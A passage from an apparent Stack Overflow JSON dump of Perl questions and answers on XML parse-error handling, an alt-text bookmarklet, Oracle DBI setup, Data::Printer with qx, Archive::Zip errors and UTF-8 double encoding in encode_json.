"view_count": 1323, "favorite_count": 1, "accepted_answer_id": 33569657, "answer_count": 1, "score": 2, "last_activity_date": 1446822125, "creation_date": 1446819180, "last_edit_date": 1446822048, "question_id": 33568767, "link": "https://stackoverflow.com/questions/33568767/handling-the-xml-parser-error", "title": "Handling the xml parser error", "body": "<p>I have lots of XML files that I have to read them and then see if they are valid or not. I have some files that have problem withe missing endtag. Now my task is to write a code that read these files and just print the error message and the name of file when there is invalid file and go to the next file.</p>\n\n<p>I am new to Perl and XML. But if I know how to handle there is entag error then I could do rest. What I know is that I have such a line in the code and reads the XML files and then looks for the parsering. If is not OK then will produce an error in command line. My aim is to have a condition and then I will write a message. </p>\n\n<pre><code> use strict;\n use warnings;\n use XML::LibXML;\n use XML::Simple;\n use XML::LibXML::XPathContext qw( );\n use XML::Writer;\n\n # reads all file\n my @testFile = &lt;*.xml&gt;;\n\n my $arrSize = @testFile;\n XML::LibXML::XPathContext-&gt;new()\n my $doc = XML::LibXML-&gt;load_xml(location =&gt; $ver);\n my $name_ver = $xml-&gt;findnodes('/Info/Name',$doc);\n ##  do some other things\n</code></pre>\n\n<p>I hope this is somehow is clear what I mean. Can anyone please let me know how could I write a condition that does not allow the code to stop, rather goes to other line and print a message.</p>\n"}, {"tags": ["javascript", "html", "regex", "perl", "alt"], "answers": [{"comments": [{"owner": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446815372, "post_id": 33567499, "comment_id": 54912956, "body": "This is great. Any way to make the output show in a separate browser tab instead of a dialog box?"}, {"owner": {"reputation": 133386, "user_id": 295783, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/da548667c834109a7059b51060e53dff?s=128&d=identicon&r=PG", "display_name": "mplungjan", "link": "https://stackoverflow.com/users/295783/mplungjan"}, "reply_to_user": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446815582, "post_id": 33567499, "comment_id": 54913079, "body": "See update - not tested since the sandbox here does not allow it"}, {"owner": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446815680, "post_id": 33567499, "comment_id": 54913132, "body": "This is brilliant! Thank you, sir."}, {"owner": {"reputation": 133386, "user_id": 295783, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/da548667c834109a7059b51060e53dff?s=128&d=identicon&r=PG", "display_name": "mplungjan", "link": "https://stackoverflow.com/users/295783/mplungjan"}, "reply_to_user": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446815897, "post_id": 33567499, "comment_id": 54913282, "body": "You are welcome. Just to let you know your question is actually off topic here as seen in the <a href=\"https://stackoverflow.com/help\">help center</a>, but I like bookmarklets :)"}, {"owner": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446816042, "post_id": 33567499, "comment_id": 54913383, "body": "As with perl, I couldn&#39;t avoid duplicate alt text from showing up with the results (for example, &#39;s page in joey&#39;s page). Is there a way to remove an entire duplicate phrase from the output?"}, {"owner": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446817122, "post_id": 33567499, "comment_id": 54914064, "body": "I apologize for the lack of upfront requirements and the offtopic. The update doesn&#39;t seem to work for me. I&#39;m trying to ignore an exact, literal phrase - &quot; &#39;s page&quot;, which still keeps showing after each result."}, {"owner": {"reputation": 133386, "user_id": 295783, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/da548667c834109a7059b51060e53dff?s=128&d=identicon&r=PG", "display_name": "mplungjan", "link": "https://stackoverflow.com/users/295783/mplungjan"}, "reply_to_user": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "edited": false, "score": 0, "creation_date": 1446817702, "post_id": 33567499, "comment_id": 54914438, "body": "Email me the page in question, please"}], "tags": [], "owner": {"reputation": 133386, "user_id": 295783, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/da548667c834109a7059b51060e53dff?s=128&d=identicon&r=PG", "display_name": "mplungjan", "link": "https://stackoverflow.com/users/295783/mplungjan"}, "is_accepted": true, "score": 2, "last_activity_date": 1446816201, "last_edit_date": 1446816201, "creation_date": 1446815149, "answer_id": 33567499, "question_id": 33567379, "link": "https://stackoverflow.com/questions/33567379/extracting-alt-text-from-image-links-with-a-javascript-bookmarklet/33567499#33567499", "title": "Extracting alt text from image links with a JavaScript bookmarklet", "body": "<p>Like this:</p>\n\n<pre><code>javascript:(function() {\n  var imgs = document.images,alts=[];\n  for (var i=0;i&lt;imgs.length;i++) {\n      alts.push(imgs[i].getAttribute(\"alt\") || \"no alt\");\n  }\n  alert(alts.join(\"\\n\"));\n})()\n</code></pre>\n\n<p>Example code:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>(function() {\r\n  var imgs = document.images,alts=[];\r\n  for (var i=0;i&lt;imgs.length;i++) {\r\n    alts.push(imgs[i].getAttribute(\"alt\") || \"no alt\");\r\n  }\r\n  console.log(alts);\r\n})()</code></pre>\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;img alt=\"alt1\" /&gt;\r\n&lt;img alt=\"\" /&gt;\r\n&lt;img alt=\"alt2\" /&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>To show in new window (popup blockers allowing)</p>\n\n<pre><code>javascript:(function() {\n  var imgs = document.images,alts=[],w;\n  for (var i=0;i&lt;imgs.length;i++) {\n    alts.push(imgs[i].getAttribute(\"alt\") || \"no alt\");\n  }\n  if (alts.length&gt;0) {\n    w = window.open(\"\",\"_blank\");\n    if (w) {\n      w.document.write(alts.join(\"&lt;br /&gt;\"));\n      w.document.close();\n    }\n    else {\n      alert(\"cannot pop\\n\"+alts.join(\"\\n\"));\n    }\n  }\n})()\n</code></pre>\n\n<p>To avoid duplicates:</p>\n\n<p>change</p>\n\n<pre><code>alts.push(imgs[i].getAttribute(\"alt\") || \"no alt\");\n</code></pre>\n\n<p>to</p>\n\n<pre><code>var alt = imgs[i].getAttribute(\"alt\");\nif (alts &amp;&amp; alts.indexOf(alt)==-1) alts.push(alt);\n</code></pre>\n"}], "owner": {"reputation": 15, "user_id": 5532972, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1be695b1dd6fb3c4021bad03b6b6b643?s=128&d=identicon&r=PG&f=1", "display_name": "lestrange", "link": "https://stackoverflow.com/users/5532972/lestrange"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 732, "favorite_count": 1, "accepted_answer_id": 33567499, "answer_count": 1, "score": 0, "last_activity_date": 1446816201, "creation_date": 1446814753, "last_edit_date": 1446815733, "question_id": 33567379, "link": "https://stackoverflow.com/questions/33567379/extracting-alt-text-from-image-links-with-a-javascript-bookmarklet", "title": "Extracting alt text from image links with a JavaScript bookmarklet", "body": "<p>I found a way to extract alt text from image links through a Perl script I found. However, the method entails downloading the target HTML; processing it through the Perl script, which then produces a text file with the specific alt text I need; and then removing some extra bits of text I couldn't filter out via code manually, as I don't know how to make regex work with Perl (I tried installing PCRE to no avail).</p>\n\n<p>This method is still impractical, and I'm sure I can extract alt text through a JavaScript bookmarklet much, much faster, and get the output neatly listed in a new tab, instantly. However, I have no knowledge on how to convert the Perl script I have to JavaScript, nor how to write one from scratch.</p>\n\n<p>Here's the Perl script: </p>\n\n<pre><code>{\n    # Get data from HTML file\n    my $From = cwd() . '/' . $ARGV[0];\n    open( HTMLFILE, '&lt;' . $From ) or die( \"Cannot open $From to read.\" );\n\n    my $Html;\n    read HTMLFILE, $Html, -s $From;\n    close HTMLFILE;\n\n    # Find IMG elements\n    print \"Images found!\";\n    my %AltTexts;\n    while ( $Html =~ /(&lt;IMG\\b.*?&gt;)/isg ) {\n        my $ImgElement = $1;\n\n        # Find SRC tag\n        $ImgElement =~ /SRC\\s*=\\s*([\\\"\\'])(.*?)\\1/is;\n        my $Src = $2;\n\n        # Find ALT tag &amp; store text\n        if ( $ImgElement =~ /ALT\\s*=\\s*([\\\"\\'])(.*?)\\1/is ) {\n            $AltTexts{$Src} = $2;\n        }\n        else {    # No ALT found so give it default text if none already found\n            unless ( exists( $AltTexts{$Src} ) ) {\n                $AltTexts{$Src} = 'NO_ALT_TEXT';\n            }\n        }\n    }\n\n    # Write extracted data to a file\n    my $To = cwd() . '/' . $ARGV[0] . '.txt';\n    open( ALTTEXTFILE, '&gt;' . $To ) or die( \"Cannot open $To to write.\" );\n\n    foreach my $SrcPath ( sort keys %AltTexts ) {\n        print ALTTEXTFILE \"$AltTexts{$SrcPath}\\n\";\n    }\n    close ALTTEXTFILE;\n}\n</code></pre>\n\n<p>I did tweak it to stop the script from printing the link, removed blank lines, etc.</p>\n\n<p>The original script can be found <a href=\"http://duramecho.com/ComputerPrograms/HtmlImgAltTextExtractAndInsert/\" rel=\"nofollow\">here</a></p>\n\n<p>So, my question is what would the JavaScript for extracting alt text look like?</p>\n"}, {"tags": ["oracle", "perl"], "answers": [{"tags": [], "owner": {"reputation": 2425, "user_id": 2081375, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7f074c1dd16c6800312459db0881888d?s=128&d=identicon&r=PG", "display_name": "are", "link": "https://stackoverflow.com/users/2081375/are"}, "is_accepted": false, "score": 0, "last_activity_date": 1446810444, "last_edit_date": 1446810444, "creation_date": 1446807869, "answer_id": 33565385, "question_id": 33564762, "link": "https://stackoverflow.com/questions/33564762/oracle-client-not-able-to-connect-using-dbioracle/33565385#33565385", "title": "Oracle client not able to connect using DBI::ORACLE", "body": "<p>This error is nearly always that ORACLE_HOME is not set properly and sometimes missing/incorrect NLS environment variables.</p>\n\n<p>you should have smth like this where you set all pathes</p>\n\n<pre><code>#!/u00/app/xxx/bin/perl \nmy $ORACLE_HOME = \"/u00/app/oracle/product/11.2.0.2\"; \nmy $ORACLE_SID=\"xxxxT11\";\n$ENV{ORACLE_HOME}=$ORACLE_HOME;\n$ENV{ORACLE_SID}=$ORACLE_SID;\n$ENV{PATH}=\"$ORACLE_HOME/bin\";\n$ENV{LD_LIBRARY_PATH}=\"$ORACLE_HOME/lib\";\nuse strict;\nuse DBI;\nmy $dbh = DBI-&gt;connect( 'dbi:Oracle:orcl', 'scott', 'tiger', ) || die \"Database connection not made: $DBI::errstr\";\n$dbh-&gt;disconnect;\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5533142"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 422, "favorite_count": 0, "answer_count": 1, "score": -5, "last_activity_date": 1446810444, "creation_date": 1446805965, "question_id": 33564762, "link": "https://stackoverflow.com/questions/33564762/oracle-client-not-able-to-connect-using-dbioracle", "title": "Oracle client not able to connect using DBI::ORACLE", "body": "<p>Oracle client not able to connect .\nError: \nDatabase connect failed:(UNKNOWN OCI STATUS 1804) OCIInitialize. Check ORACLE_HOME and NLS </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446813457, "post_id": 33564730, "comment_id": 54911808, "body": "Unlike <code>Data::Dumper</code> and <code>Data::Dump</code>, the default mode of <code>Data::Printer</code> allows you to display only the contents of variables, not arbitrary expressions"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446813769, "post_id": 33564730, "comment_id": 54912013, "body": "@Borodin Yes it seems so.. I wonder if it be difficult to implement the feature, or it has just not been considered for implementation yet?"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1446813755, "creation_date": 1446813755, "answer_id": 33567057, "question_id": 33564730, "link": "https://stackoverflow.com/questions/33564730/using-dataprinter-with-qx-operator/33567057#33567057", "title": "Using Data::Printer with qx operator", "body": "<p>Unlike <code>Data::Dumper</code> and <code>Data::Dump</code>, the default mode of <code>Data::Printer</code> allows you to display only the contents of variables, not arbitrary expressions</p>\n\n<p>This behaviour can be circumvented by disabling the <code>use_prototypes</code> option in the <code>use</code> statement, when arrays and hashes must be passed explicitly by reference</p>\n\n<pre><code>use Data::Printer use_prototypes =&gt; 0, output =&gt; 'stdout';\n\np qx/echo -n Hello/;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>\"Hello\"\n</code></pre>\n"}], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "accepted_answer_id": 33567057, "answer_count": 1, "score": 0, "last_activity_date": 1446813755, "creation_date": 1446805854, "question_id": 33564730, "link": "https://stackoverflow.com/questions/33564730/using-dataprinter-with-qx-operator", "title": "Using Data::Printer with qx operator", "body": "<p>I was experimenting with the <a href=\"https://metacpan.org/pod/Data::Printer\" rel=\"nofollow\"><code>Data::Printer</code></a> module, and it worked fine until\nI tried to print the return value of a system call using <a href=\"http://perldoc.perl.org/perlop.html#Quote-and-Quote-like-Operators\" rel=\"nofollow\">qx</a> operator:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Data::Printer;\n\np qx/echo -n Hello/;\n</code></pre>\n\n<p>This gives me the following error:</p>\n\n<pre><code>Type of arg 1 to Data::Printer::p must be one of [@$%&amp;] (not scalar)\n</code></pre>\n\n<p>I assume this error occurs because <code>qx</code> is not recognized as a scalar, hash, array, or function. So I tried:</p>\n\n<pre><code>p my $temp = qx/echo -n Hello/;\n</code></pre>\n\n<p>and it worked fine. The question is, if it is possible to avoid the use of the <code>$temp</code> variable? (I think this syntax would become annoying to use and remember in the long run)</p>\n"}, {"tags": ["perl"], "answers": [{"comments": [{"owner": {"reputation": 37, "user_id": 5171874, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e8f6c50bc14463fdca1eb9c37808e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Sur", "link": "https://stackoverflow.com/users/5171874/sur"}, "edited": false, "score": 0, "creation_date": 1446803114, "post_id": 33563699, "comment_id": 54905655, "body": "even after removing this line i am getting same error.           my $member = $somezip-&gt;memberNamed( &#39;stringMember.txt&#39; );"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 37, "user_id": 5171874, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e8f6c50bc14463fdca1eb9c37808e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Sur", "link": "https://stackoverflow.com/users/5171874/sur"}, "edited": false, "score": 0, "creation_date": 1446804134, "post_id": 33563699, "comment_id": 54906326, "body": "@sur If you remove that line, <code>$member</code> is <b>not declared</b> at all. Do you have <code>use strict</code> and <code>use warnings</code> in place? You can <b>only do something</b> on <code>$member</code> if it is <i>declared and contains the Zip::Archive member whatever object</i>."}, {"owner": {"reputation": 37, "user_id": 5171874, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e8f6c50bc14463fdca1eb9c37808e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Sur", "link": "https://stackoverflow.com/users/5171874/sur"}, "edited": false, "score": 0, "creation_date": 1446805572, "post_id": 33563699, "comment_id": 54907205, "body": "Hi simbabque, considering the fact you said that line is returning undef i have added the modified it to the file name which is present, still receiving the same error. I am kind of new to perl, kindly let me know where am going wrong."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 37, "user_id": 5171874, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e8f6c50bc14463fdca1eb9c37808e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Sur", "link": "https://stackoverflow.com/users/5171874/sur"}, "edited": false, "score": 0, "creation_date": 1446805804, "post_id": 33563699, "comment_id": 54907360, "body": "I am not familiar with Archive::Zip I&#39;m afraid. There is a method <code>memberNames</code> that should return all file names in the archive. Call that one and use Data::Dumper or Data::Printer to check. Then take it from there."}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 0, "last_activity_date": 1446802835, "creation_date": 1446802835, "answer_id": 33563699, "question_id": 33563567, "link": "https://stackoverflow.com/questions/33563567/getting-cant-call-desiredcompressionmethod-on-an-undefined-value-in-archive-pm-a/33563699#33563699", "title": "Getting cant call desiredCompressionMethod on an undefined value in Archive.pm at line 249", "body": "<p>You created a zip archive with two files: </p>\n\n<blockquote>\n<pre><code>my $file_member = $zip-&gt;addFile( 'xyz.txt', 'abc.txt' );\n</code></pre>\n</blockquote>\n\n<p>Now you try to find a file called <code>stringMember.txt</code> in the same archive. </p>\n\n<blockquote>\n<pre><code>my $member = $somezip-&gt;memberNamed( 'stringMember.txt' );\n</code></pre>\n</blockquote>\n\n<p>Obviously, that file does not exist, so <a href=\"https://metacpan.org/pod/Archive::Zip#memberNamed-string\" rel=\"nofollow\"><code>memberNamed</code> returns <code>undef</code></a> as it cannot find the file. </p>\n\n<blockquote>\n  <p>Return ref to member whose filename equals given filename or undef. $string must be in Zip (Unix) filename format.</p>\n</blockquote>\n\n<p>In consequence, you cannot call <code>desiredCompressionMethod</code> on that undefined value as the error message says.</p>\n\n<hr>\n\n<p>If you copy the code from the documentation, make sure to either copy all of it, or change the parts to copy to fit your code.</p>\n"}], "owner": {"reputation": 37, "user_id": 5171874, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/e8f6c50bc14463fdca1eb9c37808e91e?s=128&d=identicon&r=PG&f=1", "display_name": "Sur", "link": "https://stackoverflow.com/users/5171874/sur"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 88, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1446802835, "creation_date": 1446802450, "question_id": 33563567, "link": "https://stackoverflow.com/questions/33563567/getting-cant-call-desiredcompressionmethod-on-an-undefined-value-in-archive-pm-a", "title": "Getting cant call desiredCompressionMethod on an undefined value in Archive.pm at line 249", "body": "<p>I am trying to zip files with below code but getting this error \"cant call desiredCompressionMethod  on an undefined value in Archive.pm at line 249\". Below is my code. Please suggest.</p>\n\n<pre><code>    use Archive::Zip qw( :ERROR_CODES :CONSTANTS );\n\n    my $zip = Archive::Zip-&gt;new();\n\n    my $dir_member = $zip-&gt;addDirectory( 'D:\\advapp\\PSMAG\\Scripts\\Testing/' );\n    my $file_member = $zip-&gt;addFile( 'xyz.txt', 'abc.txt' );\n    unless ( $zip-&gt;writeToFileNamed('someZip.zip') == AZ_OK ) {\n    die 'write error';\n    }\n\n    my $somezip = Archive::Zip-&gt;new();\n    unless ( $somezip-&gt;read( 'someZip.zip' ) == AZ_OK ) {\n    die 'read error';\n    }\n    my $member = $somezip-&gt;memberNamed( 'stringMember.txt' );\n    $member-&gt;desiredCompressionMethod( COMPRESSION_DEFLATED );\n    unless ( $zip-&gt;writeToFileNamed( 'someOtherZip.zip' ) == AZ_OK ) {\n    die 'write error';\n    }\n</code></pre>\n"}, {"tags": ["javascript", "mysql", "ajax", "perl", "utf-8"], "answers": [{"tags": [], "owner": {"reputation": 9, "user_id": 5532917, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-FHK3AEb8nsU/AAAAAAAAAAI/AAAAAAAAE1w/1zHYcdIl8eQ/photo.jpg?sz=128", "display_name": "Anatoly Y.", "link": "https://stackoverflow.com/users/5532917/anatoly-y"}, "is_accepted": false, "score": -1, "last_activity_date": 1446802987, "creation_date": 1446802987, "answer_id": 33563747, "question_id": 33562344, "link": "https://stackoverflow.com/questions/33562344/accented-characters-are-getting-double-encoded-after-using-encode-json/33563747#33563747", "title": "Accented characters are getting double encoded after using encode_json", "body": "<p>Try this</p>\n\n<pre><code>use JSON;\nuse utf8;\nuse Data::Printer;\nutf8::encode($data) unless (utf8::is_utf8($data));\np encode_json($data);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 344, "user_id": 1254174, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/2416cff2f4d8dd65a5bf52228d86208a?s=128&d=identicon&r=PG", "display_name": "Ash_and_Perl", "link": "https://stackoverflow.com/users/1254174/ash-and-perl"}, "edited": false, "score": 0, "creation_date": 1447078629, "post_id": 33570211, "comment_id": 54996420, "body": "Thanks for the suggestion. I am not getting the same output as  mentioned in your code. Here is what I am getting as output. <code>43.75.65.76.61.73.20.47.61.72.63.ED.61 Cuevas Garc&#195;&#173;a 5B.22.43.75.65.76.61.73.20.47.61.72.63.ED.61.22.5D [&quot;Cuevas Garc&#195;&#173;a&quot;] 5B.22.43.75.65.76.61.73.20.47.61.72.63.C3.AD.61.22.5D [&quot;Cuevas Garc&#195;&#173;a&quot;]</code>... Is the initial data saved into user table is itself corrupt?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 344, "user_id": 1254174, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/2416cff2f4d8dd65a5bf52228d86208a?s=128&d=identicon&r=PG", "display_name": "Ash_and_Perl", "link": "https://stackoverflow.com/users/1254174/ash-and-perl"}, "edited": false, "score": 0, "creation_date": 1447079095, "post_id": 33570211, "comment_id": 54996689, "body": "The hex show the strings are correct, so you simply didn&#39;t specify the correct encoding for your terminal."}, {"owner": {"reputation": 105046, "user_id": 1766831, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee974306d2def46eb69534fbcf95cc5?s=128&d=identicon&r=PG", "display_name": "Rick James", "link": "https://stackoverflow.com/users/1766831/rick-james"}, "edited": false, "score": 0, "creation_date": 1449526524, "post_id": 33570211, "comment_id": 56036772, "body": "<code>ED</code> is the latin1 encoding; <code>C3 AD</code> is the utf8 encoding."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1446823899, "creation_date": 1446823899, "answer_id": 33570211, "question_id": 33562344, "link": "https://stackoverflow.com/questions/33562344/accented-characters-are-getting-double-encoded-after-using-encode-json/33570211#33570211", "title": "Accented characters are getting double encoded after using encode_json", "body": "<p>The charset of the table is irrelevant. MySQL will automatically convert from the table's encoding to the connection's encoding. Then, you'll have to decode it on the Perl side, either explicitly or by passing <code>mysql_enable_utf8 =&gt; 1</code> to the <code>connect</code>. I recommend the latter.</p>\n\n<pre><code>use utf8;                             # Source code encoded using UTF-8.\nuse open ':std', ':encoding(UTF-8)';  # Terminal expects/provides UTF-8.\n\nuse DBI      qw( );\nuse JSON::XS qw( encode_json );\n\nmy $user_id = \"...\";\n\nmy $dsn = \"...\";\nmy $user = \"...\";\nmy $password = \"...\";\n\nmy $dbh = DBI-&gt;connect(\"dbi:mysql:\".$dsn, $user, $password, {\n   PrintError =&gt; 0,\n   RaiseError =&gt; 1,\n   mysql_enable_utf8 =&gt; 1,  # Switch to UTF-8 for communication and decode.\n});\n\nmy $name = $dbh-&gt;selectrow_array(\"\n   SELECT `last_name`\n     FROM `user`\n    WHERE `user_id` = ?\n\", undef, $user_id);\n\n# Encoding being performed by \"use open\".\nprint(sprintf(\"%vX\", $name), \"\\n\");        # 47.61.72.63.ED.61\nprint($name, \"\\n\");                        # Garc\u00eda\n\n# Encoding being performed by \"use open\".\nmy $json = JSON::XS-&gt;new-&gt;encode([$name]);\nprint(sprintf(\"%vX\", $json), \"\\n\");        # 5B.22.47.61.72.63.ED.61.22.5D\nprint($json, \"\\n\");                        # [\"Garc\u00eda\"]\n\nbinmode(STDOUT); # Override \"use open\".\nmy $json_utf8 = JSON::XS-&gt;new-&gt;utf8-&gt;encode([$name]);  # aka encode_json([$name])\nprint(sprintf(\"%vX\", $json_utf8), \"\\n\");   # 5B.22.47.61.72.63.C3.AD.61.22.5D\nprint($json_utf8, \"\\n\");                   # [\"Garc\u00eda\"]\n</code></pre>\n"}], "owner": {"reputation": 344, "user_id": 1254174, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/2416cff2f4d8dd65a5bf52228d86208a?s=128&d=identicon&r=PG", "display_name": "Ash_and_Perl", "link": "https://stackoverflow.com/users/1254174/ash-and-perl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 296, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1446823899, "creation_date": 1446798170, "last_edit_date": 1446801493, "question_id": 33562344, "link": "https://stackoverflow.com/questions/33562344/accented-characters-are-getting-double-encoded-after-using-encode-json", "title": "Accented characters are getting double encoded after using encode_json", "body": "<p>I am facing an issue with the encode_json function in <code>use JSON::XS qw(encode_json);</code>. we have a web based project with Perl, JavaScript, jQuery and MySQL as the back end.</p>\n\n<p>In a particular screen in the application, the name of the user is distorted.</p>\n\n<p>The problem is the user name is in spanish and has accented characters.\nThe table where we are saving the DB is old table and has charset latin 1, but when I am fetching the data, i am using cast and convert and encoding it to UTF-8 format.</p>\n\n<pre><code>select CONVERT(CAST(CONVERT(u.last_name USING  latin1) AS BINARY) USING utf8) AS last_name from user where user_id = 'XXX'\n</code></pre>\n\n<p>In the structure where I am storing the DB results, the data is appearing fine. </p>\n\n<pre><code>{ last_name =&gt; Cvas Garc\u00eda}\n</code></pre>\n\n<p>this structure is passed to javascript function which renders the page</p>\n\n<pre><code>$data_json = encode_json( $data )\n</code></pre>\n\n<p>When I print <code>$data_json</code>, the accented characters are distorted once again. </p>\n\n<pre><code>\"user_permissions\":[{\"last_name\":\"Cvas Garc\u00c3\u00ada\"}]},\n</code></pre>\n\n<p>Can anyone help me how can I solve this, either in the Mysql or perl or javascript code?</p>\n"}, {"tags": ["perl", "split", "dynamic-arrays"], "comments": [{"owner": {"reputation": 3327, "user_id": 1604311, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/0frKT.jpg?s=128&g=1", "display_name": "Arunesh Singh", "link": 